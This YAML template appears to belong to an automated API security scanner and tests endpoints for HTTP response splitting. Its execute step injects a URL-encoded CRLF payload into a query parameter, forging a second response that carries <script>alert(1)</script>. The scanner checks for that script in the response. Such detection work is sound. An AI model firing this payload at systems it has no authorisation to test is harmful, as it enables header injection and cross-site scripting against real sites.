id: HTTP_RESPONSE_SPLITTING
info:
  name: "HTTP Response splitting using CRLF"
  description: "HTTP header injection allows attackers to add headers or inject content, leading to XSS attack"
  details: >
    "HTTP header injection is a technique where attackers insert CRLF characters to add headers or inject content, enabling actions like redirection to malicious websites or executing XSS attacks.
    By manipulating the header structure, attackers can deceive web browsers and bypass server content, potentially leading to phishing attempts or defacement of websites."
  impact: "The impact of CRLF injections varies depending on the attack context, but will typically cover all the consequences of cross-site scripting and information disclosure that the injection allowed. The technique can also be used to deactivate certain security restrictions like XSS filters and same-origin policy in the victimâ€™s browser, paving the way for other malicious attacks."
  category:
    name: CRLF
    shortName: CRLF Injection
    displayName: CRLF Injection
  subCategory: HTTP_RESPONSE_SPLITTING
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://www.invicti.com/blog/web-security/crlf-http-header/"
  cwe:
    - CWE-93
    - CWE-113
  cve:
    - CVE-2023-41834

settings:
  nature: INTRUSIVE
  plan: FREE
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  query_param:
    for_one:
      key:
        regex: .*
        extract: query_key
      value:
        extract: query_value
  response_headers:
    for_one:
      key:
        eq: "content-type"
      value:
        eq: "application/json"

execute:
  type: single
  requests:
    - req:
        - modify_query_param:
            query_key: ${query_value}%0d%0acontent-length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0acontent-type:%20text/html%0d%0acontent-length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

validate:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    contains_either: "<script>alert(1)</script>"
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  response_headers:
    for_one:
      key:
        eq: content-type
      value:
        contains_either: "text/html"
